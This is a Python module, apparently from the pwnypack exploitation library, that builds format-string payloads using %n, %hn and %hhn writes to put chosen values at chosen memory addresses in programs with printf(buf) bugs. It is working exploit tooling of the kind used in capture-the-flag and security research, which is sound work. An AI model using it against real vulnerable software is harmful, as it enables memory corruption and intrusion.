"""
The fmtstring module allows you to build format strings that can be used to
exploit format string bugs (`printf(buf);`).
"""


import pwnypack.target
import pwnypack.packing


__all__ = ['fmtstring']


FMTSTRING_OPS = {
    1: b'hhn',
    2: b'hn',
    4: b'n',
}


def fmtstring(offset, writes, written=0, max_width=2, target=None):
    """
    Build a format string that writes given data to given locations. Can be
    used easily create format strings to exploit format string bugs.

    `writes` is a list of 2- or 3-item tuples. Each tuple represents a memory
    write starting with an absolute address, then the data to write as an
    integer and finally the width (1, 2, 4 or 8) of the write.

    :func:`fmtstring` will break up the writes and try to optimise the order
    to minimise the amount of dummy output generated.

    Args:
        offset(int): The parameter offset where the format string start.
        writes(list): A list of 2 or 3 item tuples.
        written(int): How many bytes have already been written before the
            built format string starts.
        max_width(int): The maximum width of the writes (1, 2 or 4).
        target(:class:`pwnypack.target.Target`): The target architecture.

    Returns:
        bytes: The format string that will execute the specified memory
            writes.

    Example:
        The following example will (on a 32bit architecture) build a format
        string that write 0xc0debabe to the address 0xdeadbeef and the byte
        0x90 to 0xdeadbeef + 4 assuming that the input buffer is located at
        offset 3 on the stack.

        >>> from pwny import *
        >>> fmtstring(3, [(0xdeadbeef, 0xc0debabe), (0xdeadbeef + 4, 0x90, 1)])
    """

    if max_width not in (1, 2, 4):
        raise ValueError('max_width should be 1, 2 or 4')

    if target is None:
        target = pwnypack.target.target

    addrs = []
    cmds = []
    piece_writes = []

    for write in writes:
        if len(write) == 2:
            addr, value = write
            width = target.bits // 8
        else:
            addr, value, width = write
            if width not in (1, 2, 4, 8):
                raise ValueError('Invalid write width')

        piece_width = min(max_width, width)
        piece_value = getattr(pwnypack.packing, 'P%d' % (8 * width))(value, target=target)
        piece_unpack = getattr(pwnypack.packing, 'U%d' % (piece_width * 8))

        for i in range(0, width, piece_width):
            piece_writes.append((piece_width, addr, piece_unpack(piece_value[i:i + piece_width], target=target)))
            addr += piece_width

    written += len(piece_writes) * int(target.bits) // 8

    piece_writes.sort(key=lambda w_a_v: (w_a_v[2] - written) % (2 ** (max_width * 8)))

    for piece_width, piece_addr, piece_value in piece_writes:
        addrs.append(pwnypack.packing.P(piece_addr, target=target))

        piece_modulo = 2 ** (piece_width * 8)

        padding = (piece_value - written) % piece_modulo
        if padding:
            cmds.append(b'%' + str(padding).encode('ascii') + b'c')
        written = piece_value

        cmds.append(b'%' + str(offset).encode('ascii') + b'$' + FMTSTRING_OPS[piece_width])
        offset += 1

    return b''.join(addrs + cmds)
